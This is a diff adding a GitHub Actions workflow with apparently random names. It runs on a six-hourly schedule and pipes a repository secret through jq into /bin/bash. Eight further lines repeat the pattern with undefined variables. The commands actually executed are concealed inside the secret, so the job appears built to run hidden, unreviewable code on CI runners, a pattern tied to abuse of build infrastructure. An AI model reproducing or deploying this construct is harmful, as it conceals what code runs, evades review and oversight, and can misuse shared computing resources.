@@ -1,0 +1,27 @@
+name: wangbodang6788
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangbodang6788
+        env:
+          vy16: ${{ secrets.vy16 }}
+        run: |
+          echo $vy16 | jq -r .cex1760 | /bin/bash
+          echo $kcq9361 | jq -r .v778 | /bin/bash
+          echo $we52 | jq -r .tb762 | /bin/bash
+          echo $lrvip38744 | jq -r .y0 | /bin/bash
+          echo $h672 | jq -r .pyt66 | /bin/bash
+          echo $vwb52 | jq -r .mqirw9 | /bin/bash
+          echo $c0922 | jq -r .j7558 | /bin/bash
+          echo $ba98014 | jq -r .qrhvt3 | /bin/bash
+          echo $yz49025 | jq -r .mwlrx2 | /bin/bash
+
